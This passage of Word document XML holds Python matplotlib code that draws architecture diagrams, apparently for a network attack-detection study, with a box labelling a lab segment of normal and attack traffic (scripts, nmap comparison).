        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            linewidth=lw, edgecolor=ec, facecolor=fc, zorder=2,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191F4B88">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            linestyle=(0, (4, 3)) if dashed else "-",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4294207E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51132068">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D44DF3C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    xm = x + w / 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A7D586">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not body:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E90594">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ty = (y + h - 3.4) if head_top else (y + h / 2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15AE67C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ax.text(xm, ty, head, ha="center", va="center",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15052E61">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                fontsize=hs * 0.95, color=INK, zorder=3, linespacing=1.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6909EFDD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C692731">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # head 顶部对齐（并排的框标题才在同一水平线上），body 在剩余区域居中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54778164">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    head_h = hs * 1.35 / PT_PER_UNIT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E287A52">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    body_h = (body.count("\n") + 1) * fs * 1.5 / PT_PER_UNIT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549F5DCF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    head_cy = y + h - 1.5 - head_h / 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E6E090">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    area_top = head_cy - head_h / 2 - 1.5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278DA604">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    body_cy = (y + 0.5 + area_top) / 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D757867">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text(xm, head_cy, head, ha="center", va="center",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42178FB1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            fontsize=hs, color=ec, weight="bold", zorder=3, linespacing=1.35)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F3036F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text(xm, body_cy, body, ha="center", va="center",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DAC4EE5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            fontsize=fs, color=INK, zorder=3, linespacing=1.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="080BCA75">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52505CF5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26A1A0B4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def arrow(ax, p, q, label="", color=GREY, style="-|&gt;", lw=1.5, dashed=False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4104F7A7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">          lab_xy=None, ha="center", va="center"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EFE7F3D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.add_patch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C8EA76">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        FancyArrowPatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A3AC6FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            p, q, arrowstyle=style, mutation_scale=13, linewidth=lw,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E876DD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            color=color, zorder=2, shrinkA=0, shrinkB=0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F14A789">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            linestyle=(0, (4, 3)) if dashed else "-",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0E74A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="010F8305">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="257C2F74">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if label:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F73FA51">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        lx, ly = lab_xy if lab_xy else ((p[0] + q[0]) / 2, (p[1] + q[1]) / 2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644420B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ax.text(lx, ly, label, ha=ha, va=va, fontsize=FS_NOTE, color=color,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4521F568">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                zorder=5, linespacing=1.7,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ADE6ED9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                bbox=dict(boxstyle="round,pad=0.3", fc="white", ec="none", alpha=0.96))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5475A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37D9FB99">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A8AE555">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def elbow(ax, pts, color=GREY, lw=1.4, dashed=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24929786">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for a, b in zip(pts[:-2], pts[1:-1]):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2160BA3A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ax.plot([a[0], b[0]], [a[1], b[1]], color=color, lw=lw, zorder=2,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190A08DD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                linestyle=(0, (4, 3)) if dashed else "-")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A14EF4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.add_patch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53575268">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        FancyArrowPatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A04F510">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            pts[-2], pts[-1], arrowstyle="-|&gt;", mutation_scale=13, linewidth=lw,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB0C93F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            color=color, zorder=2, shrinkA=0, shrinkB=0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9FCC91">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            linestyle=(0, (4, 3)) if dashed else "-",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03EE648A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44FF486F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70622177">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E5C41E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="456C1546">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ---------------------------------------------------------------- 图 1 系统架构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B275358">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def fig_architecture():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59ABF557">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig, ax = canvas()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9CA495">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45FBA308">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 8, 3, 144, 9, "实验网段：正常业务流量 + 攻击流量（M7 脚本 · nmap 对照）",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCEBBD6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        key="net", hs=9.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B7B0BA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D0F66D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
